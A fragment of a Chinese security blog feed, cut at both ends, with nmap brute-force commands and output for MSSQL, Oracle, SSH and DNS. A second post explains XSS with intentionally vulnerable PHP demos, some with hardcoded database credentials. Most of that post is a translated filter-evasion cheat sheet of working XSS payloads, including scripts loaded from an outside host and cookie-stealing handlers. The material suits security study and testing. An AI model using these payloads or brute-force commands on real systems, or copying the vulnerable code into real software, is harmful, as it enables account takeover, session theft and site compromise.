&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt &amp;lt;host&amp;gt;
| ms-sql-brute:
|   [192.168.100.128\TEST]
|     No credentials found
|     Warnings:
|       sa: AccountLockedOut
|   [192.168.100.128\PROD]
|     Credentials found:
|       webshop_reader:secret =&amp;gt; Login Success
|       testuser:secret1234 =&amp;gt; PasswordMustChange
|_      lordvader:secret1234 =&amp;gt; Login Success
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;对oracle数据库进行暴破解&quot;&gt;对Oracle数据库进行暴破解&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL &amp;lt;host&amp;gt;
PORT     STATE  SERVICE REASON1521/tcp open  oracle  syn-ack
| oracle-brute:
|   Accounts
|     system:powell =&amp;gt; Account locked
|     haxxor:haxxor =&amp;gt; Valid credentials
|   Statistics
|_    Perfomed 157 guesses in 8 seconds, average tps: 19
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;对ssh进行暴力破解&quot;&gt;对SSH进行暴力破解&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s &amp;lt;target&amp;gt;22/ssh open  ssh
| ssh-brute:
|  Accounts
|    username:password
|  Statistics
|_   Performed 32 guesses in 25 seconds.
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;利用dns进行子域名暴力破解&quot;&gt;利用DNS进行子域名暴力破解&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;nmap --script dns-brute www.baidu.com
λ nmap --script dns-brute www.baidu.com                      

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 13:12 ?
Nmap scan report for www.baidu.com (180.97.33.108)           
Host is up (0.018s latency).                                 
Other addresses for www.baidu.com (not scanned): 180.97.33.10Not shown: 998 filtered ports                                
PORT    STATE SERVICE                                        
80/tcp  open  http                                           
443/tcp open  https                                          

Host script results:                                         
| dns-brute:                                &amp;amp;n                
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">xss</title><link href="http://localhost:4000/_posts/2020-07-11-xss/" rel="alternate" type="text/html" title="xss" /><published>2020-07-11T00:00:00-04:00</published><updated>2020-07-11T00:00:00-04:00</updated><id>http://localhost:4000/_posts/xss</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-11-xss/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;xss概念&quot;&gt;XSS概念&lt;/h1&gt;

&lt;p&gt;跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
 xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是&lt;strong&gt;寻找参数未过滤的输出函数&lt;/strong&gt;。
 常见的输出函数有： &lt;code&gt;echo printf print print_r sprintf die var-dump var_export&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;分类&quot;&gt;分类&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;反射型XSS：**&lt;非持久化&gt;** 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。&lt;/非持久化&gt;&lt;/li&gt;
  &lt;li&gt;存储型XSS：**&lt;持久化&gt;** 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）&lt;/持久化&gt;&lt;/li&gt;
  &lt;li&gt;DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;原理&quot;&gt;原理&lt;/h1&gt;

&lt;h2 id=&quot;反射型&quot;&gt;反射型&lt;/h2&gt;

&lt;p&gt;新建一个xss.php文件并加入以下代码:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;\\XSS反射演示  
&amp;lt;form action=&quot;&quot; method=&quot;get&quot;&amp;gt;  
    &amp;lt;input type=&quot;text&quot; name=&quot;xss&quot;/&amp;gt;  
    &amp;lt;input type=&quot;submit&quot; value=&quot;test&quot;/&amp;gt;  
&amp;lt;/form&amp;gt;  
&amp;lt;?php  
    $xss = @$_GET['xss'];  
    if($xss!==null){  
        echo $xss;  
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段代码中首先包含一个表单，用于向页面自己发送&lt;code&gt;GET&lt;/code&gt;请求，带一个名为xss的参数。 然后PHP会读取该参数，如果不为空，则直接打印出来，这里不存在任何过滤。也就是说，如果xss中存在HTML结构性的内容，打印之后会直接解释为HTML元素。&lt;/p&gt;

&lt;p&gt;直接输入一个js代码，比如&lt;code&gt;&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;&lt;/code&gt;可以看到触发弹窗&lt;/p&gt;

&lt;h2 id=&quot;存储型&quot;&gt;存储型&lt;/h2&gt;

&lt;p&gt;把xss.php内容改为下述内容:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;\\存储XSS演示  
&amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;  
    &amp;lt;input type=&quot;text&quot; name=&quot;xss&quot;/&amp;gt;  
    &amp;lt;input type=&quot;submit&quot; value=&quot;test&quot;/&amp;gt;  
&amp;lt;/form&amp;gt;  
&amp;lt;?php  
    $xss=@$_POST['xss'];  
    mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123&quot;);  
    mysql_select_db(&quot;xss&quot;);  
    if($xss!==null){  
        $sql=&quot;insert into temp(id,payload) values('1','$xss')&quot;;  
        $result=mysql_query($sql);  
        echo $result;  
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用户输入的内容还是没有过滤，但是不直接显示在页面中，而是插入到了数据库&lt;/p&gt;

&lt;p&gt;新建show.php，内容为：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;?php 
    mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);  
    mysql_select_db(&quot;xss&quot;);  
    $sql=&quot;select payload from temp where id=1&quot;;  
    $result=mysql_query($sql);  
    while($row=mysql_fetch_array($result)){  
        echo $row['payload'];  
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;该代码从数据库读取了之前插入的内容，并将其显示出来&lt;/p&gt;

&lt;p&gt;直接输入一个js代码，比如&lt;code&gt;&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;&lt;/code&gt;可以看到触发弹窗,且保存到数据库中了&lt;/p&gt;

&lt;h2 id=&quot;dom型&quot;&gt;DOM型&lt;/h2&gt;

&lt;p&gt;把xss.php内容改为&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;?php  
    error_reporting(0); //禁用错误报告  
    $name = $_GET[&quot;name&quot;];  
?&amp;gt;  
&amp;lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&amp;lt;?php echo $name;?&amp;gt;&quot; /&amp;gt;  
&amp;lt;div id=&quot;print&quot;&amp;gt;&amp;lt;/div&amp;gt;  
&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;  
    var text = document.getElementById(&quot;text&quot;);   
    var print = document.getElementById(&quot;print&quot;);  
    print.innerHTML = text.value; // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。  
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在URL构造：&lt;em&gt;?name=&amp;lt; img src=1 onerror = alert(xss)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;触发弹窗&lt;/p&gt;

&lt;h1 id=&quot;绕过过滤器&quot;&gt;绕过过滤器&lt;/h1&gt;

&lt;h2 id=&quot;xss定位器&quot;&gt;XSS定位器&lt;/h2&gt;

&lt;p&gt;在大多数存在漏洞且不需要特定XSS攻击代码的地方插入下列代码会弹出包含“XSS”字样的对话框。使用URL编码器来对整个代码进行编码。小技巧：如果你时间很紧想要快速检查页面，通常只要插入“&lt;任意文本&gt;”标签，然后观察页面输出是否明显改变了就可以判断是否存在漏洞：&lt;/任意文本&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//&quot;;

alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--

&amp;gt;&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;'&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果你没有足够的空间并且知道页面上没有存在漏洞的JavaScript，这个字符串是一个不错的简洁XSS注入检查。注入后查看页面源代码并且寻找是否存在&lt;strong&gt;&amp;lt;XSS&lt;/strong&gt; 或&lt;strong&gt;&amp;lt;XSS&lt;/strong&gt;字样来确认是否存在漏洞&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;'';!--&quot;&amp;lt;XSS&amp;gt;=&amp;amp;{()}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;无过滤绕过&quot;&gt;无过滤绕过&lt;/h2&gt;

&lt;p&gt;这是一个常规的XSS注入代码，虽然通常它会被防御，但是建议首先去测试一下。（引号在任何现代浏览器中都不需要，所以这里省略了它）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=http://xss.rocks/xss.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;利用多语言进行过滤绕过&quot;&gt;利用多语言进行过滤绕过&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;'&quot;&amp;gt;&amp;gt;&amp;lt;marquee&amp;gt;&amp;lt;img src=x onerror=confirm(1)&amp;gt;&amp;lt;/marquee&amp;gt;&quot;&amp;gt;&amp;lt;/plaintext\&amp;gt;&amp;lt;/|\&amp;gt;&amp;lt;plaintext/onmouseover=prompt(1)&amp;gt;

&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;@gmail.com&amp;lt;isindex formaction=javascript:alert(/XSS/) type=submit&amp;gt;'--&amp;gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;

&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&quot;&amp;gt;

&amp;lt;img/id=&quot;confirm&amp;amp;lpar;1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id)&amp;gt;'&quot;&amp;gt;

&amp;lt;img src=&quot;http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;通过javascript命令实现的图片xss&quot;&gt;通过JavaScript命令实现的图片XSS&lt;/h2&gt;

&lt;p&gt;图片注入使用JavaScript命令实现（IE7.0 不支持在图片上下文中使用JavaScript 命令，但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;无分号无引号&quot;&gt;无分号无引号&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=javascript:alert('XSS')&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;不区分大小写的xss攻击向量&quot;&gt;不区分大小写的XSS攻击向量&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=JaVaScRiPt:alert('XSS')&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;html实体&quot;&gt;HTML实体&lt;/h2&gt;

&lt;p&gt;必须有分号才可生效&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=javascript:alert(&amp;amp;quot;XSS&amp;amp;quot;)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;重音符混淆&quot;&gt;重音符混淆&lt;/h2&gt;

&lt;p&gt;如果你的JavaScript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包含JavaScript 代码。这通常会有很大帮助，因为大部分跨站脚本过滤器都没有过滤这个字符&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=`javascript:alert(&quot;RSnake says, 'XSS'&quot;)`&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;畸形的a标签&quot;&gt;畸形的A标签&lt;/h2&gt;

&lt;p&gt;跳过HREF标签找到XSS的重点。。。由DavidCross提交~已在Chrome上验证&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;a onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;xxs link&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此外Chrome经常帮你补全确实的引号。。。如果在这方面遇到问题就直接省略引号，Chrome会帮你补全在URL或脚本中缺少的引号&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;a onmouseover=alert(document.cookie)&amp;gt;xxs link&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;畸形的img标签&quot;&gt;畸形的IMG标签&lt;/h2&gt;

&lt;p&gt;最初由Begeek发现（短小精湛适用于所有浏览器），这个XSS攻击向量使用了不严格的渲染引擎来构造含有IMG标签并被引号包含的XSS攻击向量。我猜测这种解析原来是为了兼容不规范的编码。这会让它更加难以正确的解析HTML标签&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG &quot;&quot;&quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;fromcharcode函数&quot;&gt;fromCharCode函数&lt;/h2&gt;

&lt;p&gt;如果不允许任何形式的引号，你可以通过执行JavaScript里的fromCharCode函数来创建任何你需要的XSS攻击向量&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用默认src属性绕过src域名过滤器&quot;&gt;使用默认SRC属性绕过SRC域名过滤器&lt;/h2&gt;

&lt;p&gt;这种方法可以绕过大多数SRC域名过滤器。将JavaScript代码插入事件方法同样适用于注入使用elements的任何HTML标签，例如Form,Iframe, Input,  Embed等等。它同样允许将事件替换为任何标签中可用的事件类型，例如onblur,onclick。下面会给出许多不同的可注入事件列表。由David Cross提交，Abdullah Hussam(@Abdulahhusam)编辑&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=# onmouseover=&quot;alert('xxs')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用默认为空的src属性&quot;&gt;使用默认为空的SRC属性&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC= onmouseover=&quot;alert('xxs')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用不含src属性&quot;&gt;使用不含SRC属性&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG onmouseover=&quot;alert('xxs')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;通过error事件触发alert&quot;&gt;通过error事件触发alert&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&amp;gt;&amp;lt;/img&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;对img标签中onerror属性进行编码&quot;&gt;对IMG标签中onerror属性进行编码&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;img src=x onerror=&quot;&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;十进制html字符实体编码&quot;&gt;十进制HTML字符实体编码&lt;/h2&gt;

&lt;p&gt;所有在IMG标签里直接使用javascript:形式的XSS示例无法在Firefox或Netscape8.1以上浏览器（使用Gecko渲染引擎）运行&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt; &amp;lt;IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;
    &amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;不带分号的十进制html字符实体编码&quot;&gt;不带分号的十进制HTML字符实体编码&lt;/h2&gt;

&lt;p&gt;这对于绕过对“&amp;amp;#XX;”形式的XSS过滤非常有用，因为大多数人不知道最长可使用7位数字。这同样对例如$tmp_string  =~s/.&lt;em&gt;\&amp;amp;#(\d+);.&lt;/em&gt;/$1/;形式的过滤器有效，这种过滤器是错误的认为HTML字符实体编码需要用分号结尾（无意中发现的&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt; &amp;lt;IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;   #0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;不带分号的十六进制html字符实体编码&quot;&gt;不带分号的十六进制HTML字符实体编码&lt;/h2&gt;

&lt;p&gt;这是有效绕过例如$tmp_string =~ s/.&lt;em&gt;\&amp;amp;#(\d+);.&lt;/em&gt;/$1/;过滤器的方法。这种过滤器错误的认为#号后会跟着数字（十六进制HTML字符实体编码并非如此）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;内嵌tab&quot;&gt;内嵌TAB&lt;/h2&gt;

&lt;p&gt;使用TAB来分开XSS攻击代码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;内嵌编码后tab&quot;&gt;内嵌编码后TAB&lt;/h2&gt;

&lt;p&gt;使用编码后的TAB来分开XSS攻击代码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav&amp;amp;#x09;ascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;内嵌换行分隔xss攻击代码&quot;&gt;内嵌换行分隔XSS攻击代码&lt;/h2&gt;

&lt;p&gt;一些网站声称09到13（十进制）的HTML实体字符都可以实现这种攻击，这是不正确的。只有09（TAB），10（换行）和13（回车）有效。查看ASCII字符表获取更多细节。下面几个XSS示例介绍了这些向量&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav&amp;amp;#x0A;ascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;内嵌回车分隔xss攻击代码&quot;&gt;内嵌回车分隔XSS攻击代码&lt;/h2&gt;

&lt;p&gt;注意：上面使用了比实际需要长的字符串是因为0可以忽略。经常可以遇到过滤器解码十六进制和十进制编码时认为只有2到3位字符。实际规则是1至7位字符&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;jav&amp;amp;#x0D;ascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用空字符分隔javascript指令&quot;&gt;使用空字符分隔JavaScript指令&lt;/h2&gt;

&lt;p&gt;空字符同样可以作为XSS攻击向量，但和上面有所区别，你需要使用一些例如Burp工具或在URL字符串里使用%00，亦或你想使用VIM编写自己的注入工具（^V^@会生成空字符），还可以通过程序生成它到一个文本文件。老版本的Opera浏览器（例如Windows版的7.11）还会受另一个字符173（软连字符）的影响。但是空字符%00更加有用并且能帮助绕过真实世界里的过滤器，例如这个例子里的变形：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;perl -e 'print &quot;&amp;lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&amp;gt;&quot;;' &amp;gt; out
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;利用img标签中javascript指令前的空格和元字符&quot;&gt;利用IMG标签中JavaScript指令前的空格和元字符&lt;/h2&gt;

&lt;p&gt;如果过滤器不计算”javascript:”前的空格，这是正确的，因为它们不会被解析，但这点非常有用。因为这会造成错误的假设，就是引号和”javascript:”字样间不能有任何字符。实际情况是你可以插入任何十进制的1至32号字符&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot; &amp;amp;#14;  javascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;利用非字母非数字字符&quot;&gt;利用非字母非数字字符&lt;/h2&gt;

&lt;p&gt;FireFox的HTML解析器认为HTML关键词后不能有非字母非数字字符，并且认为这是一个空白或在HTML标签后的无效符号。但问题是有的XSS过滤器认为它们要查找的标记会被空白字符分隔。例如”&amp;lt;SCRIPT\s” != “&amp;lt;SCRIPT/XSS\s”:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT/XSS SRC=&quot;http://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;基于上面的原理，可以使用模糊测试进行扩展。Gecko渲染引擎允许任何字符包括字母，数字或特殊字符（例如引号，尖括号等）存在于事件名称和等号之间，这会使得更加容易绕过跨站脚本过滤。注意这同样适用于下面看到的重音符:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yair Amit让我注意到了IE和Gecko渲染引擎有一点不同行为，在于是否在HTML标签和参数之间允许一个不含空格的斜杠。这会非常有用如果系统不允许空格的时候&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;额外的尖括号&quot;&gt;额外的尖括号&lt;/h2&gt;

&lt;p&gt;这个XSS攻击向量可以绕过某些检测引擎，比如先查找第一个匹配的尖括号，然后比较里面的标签内容，而不是使用更有效的算法，例如Boyer-Moore算法就是查找整个字符串中的尖括号和相应标签（当然是通过模糊匹配）。双斜杠注释了额外的尖括号来防止出现JavaScript错误&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;&amp;lt;SCRIPT&amp;gt;alert(&quot;XSS&quot;);//&amp;lt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;未闭合的script标签&quot;&gt;未闭合的script标签&lt;/h2&gt;

&lt;p&gt;在Firefox和Netscape  8.1的Gecko渲染引擎下你不是必须构造类似“&amp;gt;&amp;lt;/SCRIPT&amp;gt;”的跨站脚本攻击向量。Firefox假定闭合HTML标签是安全的并且会为你添加闭合标记。多么体贴！不像不影响Firefox的下一个问题，这不需要在后面有额外的HTML标签。如果需要可以添加引号，但通常是没有必要的，需要注意的是，我并不知道这样注入后HTML会什么样子结束:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=http://xss.rocks/xss.js?&amp;lt; B &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;script标签中的协议解析&quot;&gt;script标签中的协议解析&lt;/h2&gt;

&lt;p&gt;这个特定的变体是由Łukasz  Pilorz提交的并且基于Ozh提供的协议解析绕过。这个跨站脚本示例在IE和Netscape的IE渲染模式下有效，如果添加了&amp;lt;/SCRIPT&amp;gt;标记在Opera中也可以。这在输入空间有限的情况下是非常有用的，你所使用的域名越短越好。”.j”是可用的，在SCRIPT标签中不需要考虑编码类型因为浏览器会自动识别&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=//xss.rocks/.j&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;只含左尖括号的htmljavascript-xss向量&quot;&gt;只含左尖括号的HTML/JavaScript XSS向量&lt;/h2&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;IE渲染引擎不像Firefox，不会向页面中添加额外数据。但它允许在IMG标签中直接使用javascript。这对构造攻击向量是很有用的，因为不需要闭合尖括号。这使得有任何HTML标签都可以进行跨站脚本攻击向量注入。甚至可以不使用”&amp;gt;”闭合标签。注意：这会让HTML页面变得混乱，具体程度取决于下面的HTML标签。这可以绕过以下NIDS正则:/((\%3D)&lt;/td&gt;
      &lt;td&gt;(=))[^\n]*((\%3C)&lt;/td&gt;
      &lt;td&gt;&amp;lt;)[^\n]+((\%3E)&lt;/td&gt;
      &lt;td&gt;&amp;gt;)/因为不需要”&amp;gt;”闭合。另外在实际对抗XSS过滤器的时候，使用一个半开放的&amp;lt;IFRAME标签替代&amp;lt;IMG标签也是非常有效的&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;javascript:alert('XSS')&quot; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;多个左尖括号&quot;&gt;多个左尖括号&lt;/h2&gt;

